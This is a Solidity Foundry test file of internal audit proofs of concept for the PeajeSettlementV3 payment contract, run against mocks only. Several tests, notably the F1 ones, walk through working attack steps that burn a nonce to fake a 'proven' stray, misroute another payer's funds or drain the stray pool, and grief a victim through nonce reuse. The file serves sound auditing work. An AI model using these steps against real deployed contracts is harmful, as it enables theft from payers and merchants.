// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Vm} from "forge-std/Vm.sol";
import {PeajeSettlementV3} from "../../src/PeajeSettlementV3.sol";
import {MockStablecoin} from "../mocks/MockStablecoinV3.sol";
import {BaseV3} from "../v3/BaseV3.t.sol";

/// @dev Internal audit PoCs for the payment paths of PeajeSettlementV3 (settle, settleStray,
///      _split, _payout). Each test proves one finding of the audit report; names start with
///      the finding id. Nothing here touches a live network.
contract PaymentPathsAuditTest is BaseV3 {
    uint256 internal constant ATTACKER_KEY = 0xBADBAD;
    address internal attacker = vm.addr(ATTACKER_KEY);

    bytes32 internal constant PAYMENT_SETTLED_SIG =
        keccak256("PaymentSettled(bytes32,address,address,address,uint256,uint256,uint256,uint256)");

    // Logs seen so far, the way an indexer or the gateway would see them.
    mapping(bytes32 nonce => bool) internal settledByNonce;
    mapping(address payer => mapping(bytes32 nonce => uint256)) internal settledByPayerNonce;

    function setUp() public override {
        super.setUp();
        vm.recordLogs();
    }

    // ---------------------------------------------------------------- helpers

    function _ingestLogs() internal {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter != address(settlement) || logs[i].topics[0] != PAYMENT_SETTLED_SIG) continue;
            bytes32 nonce = logs[i].topics[1];
            (address payer,,,,) = abi.decode(logs[i].data, (address, uint256, uint256, uint256, uint256));
            settledByNonce[nonce] = true;
            ++settledByPayerNonce[payer][nonce];
        }
    }

    /// Replica of the PRE-FIX gateway check, apps/gateway/src/liquidacion-v3.ts:187-195 as audited
    /// (`adelantado`), kept to document F1; the gateway has since changed. The authorization
    /// is used at the token, the contract balance covers `value`, and no PaymentSettled with
    /// this nonce exists (getLogs filtered by the `nonce` topic only). True = 'probado': the
    /// gateway records a stray for the Safe and serves the request once.
    function _gatewayProvesStray(address payer, bytes32 nonce, uint256 value) internal returns (bool) {
        _ingestLogs();
        if (!usdc.authorizationState(payer, nonce)) return false;
        if (usdc.balanceOf(address(settlement)) < value) return false;
        return !settledByNonce[nonce];
    }

    function _sign(uint256 key, address to, uint256 value, uint256 validBefore, bytes32 nonce)
        internal
        view
        returns (PeajeSettlementV3.Authorization memory auth)
    {
        auth.from = vm.addr(key);
        auth.value = value;
        auth.validBefore = validBefore;
        auth.nonce = nonce;
        bytes32 structHash = keccak256(
            abi.encode(usdc.TRANSFER_WITH_AUTHORIZATION_TYPEHASH(), auth.from, to, value, 0, validBefore, nonce)
        );
        (auth.v, auth.r, auth.s) =
            vm.sign(key, keccak256(abi.encodePacked("\x19\x01", usdc.DOMAIN_SEPARATOR(), structHash)));
    }

    /// Spends `nonce` of `key` at the token without sending anything to the settlement:
    /// a zero-value transferWithAuthorization to the signer itself. (On USDC,
    /// `cancelAuthorization` has the same effect.)
    function _burnNonce(uint256 key, bytes32 nonce) internal {
        PeajeSettlementV3.Authorization memory a = _sign(key, vm.addr(key), 0, block.timestamp + 300, nonce);
        usdc.transferWithAuthorization(a.from, a.from, 0, 0, a.validBefore, nonce, a.v, a.r, a.s);
    }

    // ------------------------------------------------- F1: settleStray pooled balance

    /// F1. A payer with zero balance burns its own nonce, then hands the gateway a valid
    /// authorization (to = contract) with that nonce. The gateway's proof passes because an
    /// unrelated honest stray sits in the contract; the Safe's settleStray for the attacker's
    /// nonce passes the on-chain checks and pays the attacker's merchant with the honest
    /// payer's money. The honest stray can then never be routed.
    function test_F1_BurnedNonceMisroutesAnotherPayersStray() public {
        // Honest agent's payment for `merchant` is front-run: 1 USDC sits unsplit in the contract.
        PeajeSettlementV3.Authorization memory honest = _authorize(usdc, 1e6, "honest");
        _frontRun(usdc, honest);
        assertTrue(_gatewayProvesStray(agent, "honest", 1e6));

        // Attacker: no funds at all.
        assertEq(usdc.balanceOf(attacker), 0);
        bytes32 n = keccak256("attacker-nonce");
        // The credential it sends to the gateway is a genuine signature to the contract
        // (mppx's verify passes: to, value, signature).
        PeajeSettlementV3.Authorization memory cred = _sign(ATTACKER_KEY, address(settlement), 1e6, block.timestamp + 300, n);
        assertEq(cred.from, attacker);
        // But it burned the nonce first.
        _burnNonce(ATTACKER_KEY, n);

        // relayer's settle can only fail now
        vm.prank(relayer);
        vm.expectRevert(MockStablecoin.AuthorizationAlreadyUsed.selector);
        settlement.settle(address(usdc), otherMerchant, cred, 0);

        // Gateway heuristic: 'probado' -> serves the request for free and queues a stray.
        assertTrue(_gatewayProvesStray(attacker, n, 1e6), "gateway serves the attacker");

        // The Safe executes the queued stray: every on-chain check passes.
        vm.prank(owner);
        settlement.settleStray(address(usdc), otherMerchant, attacker, 1e6, n, 0);
        assertEq(usdc.balanceOf(otherMerchant), 980_000, "attacker's merchant paid with the honest payer's money");

        // The honest stray is now unroutable.
        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSelector(PeajeSettlementV3.InsufficientStray.selector, 0, 1e6));
        settlement.settleStray(address(usdc), merchant, agent, 1e6, "honest", 0);
        assertEq(usdc.balanceOf(merchant), 0);
        assertEq(usdc.balanceOf(attacker), 0, "attacker spent nothing but gas");
    }

    /// F1 (theft variant). The attacker is a registered business on Peaje. It calls its own
    /// endpoint, priced at the whole stray pool, with a burned nonce: the gateway records a
    /// "proven" stray naming the attacker's payout wallet. If the Safe executes the row with
    /// the documented check (no PaymentSettled for the nonce), the pool goes to the attacker.
    function test_F1_MerchantAttackerDrainsStrayPool() public {
        for (uint256 i; i < 3; ++i) {
            _frontRun(usdc, _authorize(usdc, 1e6, keccak256(abi.encode("honest", i))));
        }
        assertEq(usdc.balanceOf(address(settlement)), 3e6);

        address attackerPayout = makeAddr("attacker payout wallet");
        bytes32 n = keccak256("fake-stray");
        _burnNonce(ATTACKER_KEY, n);
        assertTrue(_gatewayProvesStray(attacker, n, 3e6));

        vm.prank(owner);
        settlement.settleStray(address(usdc), attackerPayout, attacker, 3e6, n, 0);
        assertEq(usdc.balanceOf(attackerPayout), 2_940_000, "98% of three honest payments");
        assertEq(usdc.balanceOf(address(settlement)), 0);
    }

    /// F1 (amplification). One donation of V backs an unlimited number of 'proven' strays:
    /// nothing reserves the balance, so every fresh burned nonce passes the same check.
    function test_F1_OneDonationBacksUnlimitedFreeRequests() public {
        usdc.mint(attacker, 1e6);
        vm.prank(attacker);
        usdc.transfer(address(settlement), 1e6); // plain donation, one time

        uint256 served;
        for (uint256 i; i < 20; ++i) {
            bytes32 n = keccak256(abi.encode("free", i));
            _burnNonce(ATTACKER_KEY, n);
            if (_gatewayProvesStray(attacker, n, 1e6)) ++served;
        }
        assertEq(served, 20, "20 requests served against a single 1 USDC donation");
        assertEq(usdc.balanceOf(address(settlement)), 1e6);

        // Only the first queued stray can ever be executed by the Safe.
        vm.startPrank(owner);
        settlement.settleStray(address(usdc), otherMerchant, attacker, 1e6, keccak256(abi.encode("free", uint256(0))), 0);
        vm.expectRevert(abi.encodeWithSelector(PeajeSettlementV3.InsufficientStray.selector, 0, 1e6));
        settlement.settleStray(address(usdc), otherMerchant, attacker, 1e6, keccak256(abi.encode("free", uint256(1))), 0);
        vm.stopPrank();
    }

    // --------------------------------- F2: settleStray does not bind the named nonce

    /// F2. settleStray accepts a nonce that `settle` already paid (second PaymentSettled for the
    /// same token/payer/nonce) and moves a plain donation to an address the owner controls.
    /// Contradicts "settleStray solo mueve el que nombra", "nunca se barre a Peaje" and
    /// "plata mandada sin autorización queda atrapada".
    function test_F2_SettleStrayReroutesSettledNonceAndSweepsDonation() public {
        _settle(usdc, merchant, 1e6, 0, "pay-1"); // honest, complete payment
        usdc.mint(stranger, 5e6);
        vm.prank(stranger);
        usdc.transfer(address(settlement), 5e6); // donation, "trapped by design"

        // Peaje's own roles are rejected as merchant now, but a fresh wallet the Safe controls
        // is indistinguishable from a business wallet: the owner-trust gap remains.
        address safeControlled = makeAddr("fresh wallet controlled by the Safe signers");
        vm.prank(owner);
        settlement.settleStray(address(usdc), safeControlled, agent, 5e6, "pay-1", MAX_NETWORK_FEE);

        _ingestLogs();
        assertEq(settledByPayerNonce[agent]["pay-1"], 2, "two PaymentSettled for one authorization");
        uint256 price = 5e6 - MAX_NETWORK_FEE;
        assertEq(usdc.balanceOf(safeControlled), price - (price * 200) / 10_000, "donation swept to the owner");
        assertEq(usdc.balanceOf(address(settlement)), 0);
    }

    /// F2 (value not bound). With two strays in the pool, settleStray for the small one can be
    /// executed with the large one's value: `value` is never checked against what was signed.
    function test_F2_SettleStrayValueNotBoundToSignedValue() public {
        _frontRun(usdc, _authorize(usdc, 10_000, "small"));
        _frontRun(usdc, _authorize(usdc, 5e6, "large"));

        vm.prank(owner);
        settlement.settleStray(address(usdc), merchant, agent, 5e6 + 10_000, "small", 0);
        assertEq(usdc.balanceOf(address(settlement)), 0);

        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSelector(PeajeSettlementV3.InsufficientStray.selector, 0, 5e6));
        settlement.settleStray(address(usdc), otherMerchant, agent, 5e6, "large", 0);
    }

    // ------------------------------------- F3: nonce-only event key, griefing a victim

    /// F3. PaymentSettled indexes `nonce` but nonces are per payer. A front-runner that also
    /// settles a tiny payment of its own with the victim's nonce value makes the gateway's
    /// nonce-only lookup refuse the victim ('sin-prueba'): not served, no stray recorded,
    /// although the victim's money is sitting in the contract.
    function test_F3_NonceOnlyLookupDeniesFrontRunVictim() public {
        bytes32 n = keccak256("victim-nonce");
        PeajeSettlementV3.Authorization memory victim = _authorize(usdc, 1e6, n);
        _frontRun(usdc, victim);

        // Attacker reuses the same nonce value from its own address, through Peaje.
        usdc.mint(attacker, 1_000);
        PeajeSettlementV3.Authorization memory own = _sign(ATTACKER_KEY, address(settlement), 1_000, block.timestamp + 300, n);
        vm.prank(relayer);
        settlement.settle(address(usdc), otherMerchant, own, 0);

        assertFalse(_gatewayProvesStray(agent, n, 1e6), "victim refused by the nonce-only filter");
        assertEq(settledByPayerNonce[agent][n], 0, "a (payer, nonce) key would have proven it");
        assertEq(usdc.balanceOf(address(settlement)), 1e6, "victim's funds are in the contract");
    }

    // ---------------------------------------- F4: networkFee is not bound to value

    /// F4. The payer signs only `value`; the relayer splits it into price and networkFee.
    /// For any payment at or below the cap, the merchant can be left with one unit.
    function test_F4_RelayerNetworkFeeAbsorbsMicropayment() public {
        // $0.001 call (typical x402 price): merchant 0.000001, Peaje 0.000999.
        uint256 net = _settle(usdc, merchant, 1_000, 999, "micro");
        assertEq(net, 1);
        assertEq(usdc.balanceOf(treasury), 999);

        // $0.02 call: still within the $0.02 cap.
        net = _settle(usdc, otherMerchant, 20_001, 20_000, "cent");
        assertEq(net, 1);
        assertEq(usdc.balanceOf(treasury), 999 + 20_000);
    }

    // ---------------------------------------------- F5: no validity window on-chain

    /// F5. Nothing on-chain bounds validBefore. An authorization that was never sent (origin
    /// failed, simulation passed) stays redeemable by any enabled relayer, to any merchant,
    /// for as long as the agent's validBefore says: here, a year later.
    function test_F5_NoValidityCapAuthorizationRedeemableAYearLater() public {
        PeajeSettlementV3.Authorization memory a =
            _sign(AGENT_KEY, address(settlement), 1e6, type(uint256).max, "never-sent");
        vm.warp(block.timestamp + 365 days);
        vm.prank(relayer);
        settlement.settle(address(usdc), stranger, a, MAX_NETWORK_FEE);
        assertEq(usdc.balanceOf(stranger), 960_400);
    }

    // ------------------------------- F6: outbound-only fee-on-transfer is not detected

    /// F6. The balance checks only see the contract's own balance. A token that skims on the
    /// way OUT (deducted from the recipient) passes both checks and PaymentSettled.net
    /// overstates what the merchant got. Informational: USDC/USDG do not do this.
    function test_F6_OutboundSkimNotDetected() public {
        MockOutboundSkim skim = new MockOutboundSkim(address(0));
        PeajeSettlementV3 s = _deploy(address(skim), MAX_NETWORK_FEE);
        skim.setSource(address(s));
        skim.mint(agent, 1e6);

        bytes32 structHash = keccak256(
            abi.encode(skim.TRANSFER_WITH_AUTHORIZATION_TYPEHASH(), agent, address(s), 1e6, 0, block.timestamp + 300, bytes32("o"))
        );
        PeajeSettlementV3.Authorization memory a;
        a.from = agent;
        a.value = 1e6;
        a.validBefore = block.timestamp + 300;
        a.nonce = "o";
        (a.v, a.r, a.s) = vm.sign(AGENT_KEY, keccak256(abi.encodePacked("\x19\x01", skim.DOMAIN_SEPARATOR(), structHash)));

        vm.prank(relayer);
        uint256 net = s.settle(address(skim), merchant, a, 0);
        assertEq(net, 980_000);
        assertEq(skim.balanceOf(merchant), 970_200, "merchant got 1% less than the event says");
        assertEq(skim.balanceOf(address(s)), 0);
    }

    // ------------------------------------------------------- coverage checks (fine)

    /// The split never leaks: for any value/networkFee the contract accepts, net + fee +
    /// networkFee == value and fee <= 2% of price; otherwise it reverts. No bounds on value.
    function testFuzz_Audit_SplitIsExactOrReverts(uint256 value, uint256 networkFee) public view {
        networkFee = bound(networkFee, 0, MAX_NETWORK_FEE);
        try settlement.quote(value, networkFee) returns (uint256 net, uint256 fee) {
            assertEq(net + fee + networkFee, value);
            assertLe(fee * 10_000, (value - networkFee) * 200);
        } catch {
            // value <= networkFee, or (value - networkFee) * 200 overflows (> 5.7e74 units)
            assertTrue(value <= networkFee || value - networkFee > type(uint256).max / 200);
        }
    }

    /// A compromised relayer cannot touch funds already in the contract through settle. Naming
    /// itself as merchant is rejected outright; with a fresh address it controls, it gets
    /// exactly the net of the authorization it pulled and the held funds stay put.
    function test_Audit_CompromisedRelayerCannotDrainStrays() public {
        _frontRun(usdc, _authorize(usdc, 5e6, "stray"));
        usdc.mint(relayer, 1e6);
        vm.prank(relayer);
        usdc.transfer(address(settlement), 1e6);

        uint256 key = 0xDEAD;
        address mule = vm.addr(key);
        usdc.mint(mule, 1e6);
        PeajeSettlementV3.Authorization memory a = _sign(key, address(settlement), 1e6, block.timestamp + 300, "x");

        // 1. The relayer itself as merchant: InvalidMerchant, nothing moves, auth stays unused.
        vm.expectRevert(abi.encodeWithSelector(PeajeSettlementV3.InvalidMerchant.selector, relayer));
        vm.prank(relayer);
        settlement.settle(address(usdc), relayer, a, MAX_NETWORK_FEE);
        assertFalse(usdc.authorizationState(mule, "x"));
        assertEq(usdc.balanceOf(address(settlement)), 6e6);

        // 2. A fresh address the relayer controls: accepted (the contract cannot know), but it
        //    receives only this payment's net and the 6 USDC held stay in the contract.
        address relayerWallet = makeAddr("fresh wallet of the compromised relayer");
        vm.prank(relayer);
        uint256 net = settlement.settle(address(usdc), relayerWallet, a, MAX_NETWORK_FEE);
        assertEq(net, 960_400);
        assertEq(usdc.balanceOf(relayerWallet), 960_400);
        assertEq(usdc.balanceOf(address(settlement)), 6e6);
    }

    /// New code: settleStray's exit-balance check does not catch a token that skims from the
    /// recipient (the contract still loses exactly `value`), contrary to its inline comment.
    function test_F6_OutboundSkimAlsoPassesSettleStrayCheck() public {
        MockOutboundSkim skim = new MockOutboundSkim(address(0));
        PeajeSettlementV3 s = _deploy(address(skim), MAX_NETWORK_FEE);
        skim.setSource(address(s));
        skim.mint(agent, 1e6);

        bytes32 structHash = keccak256(
            abi.encode(skim.TRANSFER_WITH_AUTHORIZATION_TYPEHASH(), agent, address(s), 1e6, 0, block.timestamp + 300, bytes32("fr"))
        );
        (uint8 v, bytes32 r, bytes32 sig) =
            vm.sign(AGENT_KEY, keccak256(abi.encodePacked("\x19\x01", skim.DOMAIN_SEPARATOR(), structHash)));
        vm.prank(stranger);
        skim.transferWithAuthorization(agent, address(s), 1e6, 0, block.timestamp + 300, "fr", v, r, sig);

        vm.prank(owner);
        uint256 net = s.settleStray(address(skim), merchant, agent, 1e6, "fr", 0);
        assertEq(net, 980_000);
        assertEq(skim.balanceOf(merchant), 970_200, "skimmed, yet BalanceNotRestored did not fire");
    }

    /// New code: `_setAcceptedToken` always calls `decimals()`, also to delist. A listed token
    /// whose `decimals()` starts reverting (upgraded proxy, broken token) cannot be delisted;
    /// the only lever left is pausing every token.
    /// Regression: delisting with a zero cap no longer reads decimals(), so a token whose
    /// decimals() breaks can still be delisted. A nonzero cap on it still reverts.
    function test_New_DelistDoesNotDependOnTokenDecimals() public {
        MockBrokenDecimals broken = new MockBrokenDecimals();
        vm.prank(owner);
        settlement.setAcceptedToken(address(broken), true, MAX_NETWORK_FEE);

        broken.breakDecimals();
        vm.prank(owner);
        settlement.setAcceptedToken(address(broken), false, 0);
        assertFalse(settlement.isAcceptedToken(address(broken)));

        vm.expectRevert(MockBrokenDecimals.Broken.selector);
        vm.prank(owner);
        settlement.setAcceptedToken(address(broken), true, MAX_NETWORK_FEE);
    }

    /// An authorization signed for one token cannot be settled through another accepted token
    /// (the domain's verifyingContract differs), and one signed for another settlement
    /// deployment cannot be settled here (`to` differs).
    function test_Audit_AuthorizationBoundToTokenAndDeployment() public {
        MockStablecoin usdg = new MockStablecoin("Global Dollar", "1", 6);
        usdg.mint(agent, 1e6);
        vm.prank(owner);
        settlement.setAcceptedToken(address(usdg), true, MAX_NETWORK_FEE);

        PeajeSettlementV3.Authorization memory forUsdc = _authorize(usdc, 1e6, "t");
        vm.prank(relayer);
        vm.expectRevert(MockStablecoin.InvalidSignature.selector);
        settlement.settle(address(usdg), merchant, forUsdc, 0);

        PeajeSettlementV3 other = _deploy(address(usdc), MAX_NETWORK_FEE);
        PeajeSettlementV3.Authorization memory forOther = _authorizeTo(usdc, AGENT_KEY, address(other), 1e6, "d");
        vm.prank(relayer);
        vm.expectRevert(MockStablecoin.InvalidSignature.selector);
        settlement.settle(address(usdc), merchant, forOther, 0);
    }
}

/// @dev `decimals()` works until `breakDecimals()`, as after a bad upgrade of a proxy token.
///      Only `decimals()` matters: it is the one call `setAcceptedToken` makes to the token.
contract MockBrokenDecimals {
    bool public broken;

    error Broken();

    function breakDecimals() external {
        broken = true;
    }

    function decimals() external view returns (uint8) {
        if (broken) revert Broken();
        return 6;
    }
}

/// @dev Skims 1% from every transfer whose sender is `source`, taken from the recipient.
contract MockOutboundSkim is MockStablecoin {
    address public source;
    address public constant SKIM = address(0x5C1A);

    constructor(address source_) MockStablecoin("Skim", "1", 6) {
        source = source_;
    }

    function setSource(address source_) external {
        source = source_;
    }

    function _update(address from, address to, uint256 value) internal override {
        if (from == source && from != address(0) && to != address(0)) {
            uint256 cut = value / 100;
            super._update(from, SKIM, cut);
            super._update(from, to, value - cut);
        } else {
            super._update(from, to, value);
        }
    }
}
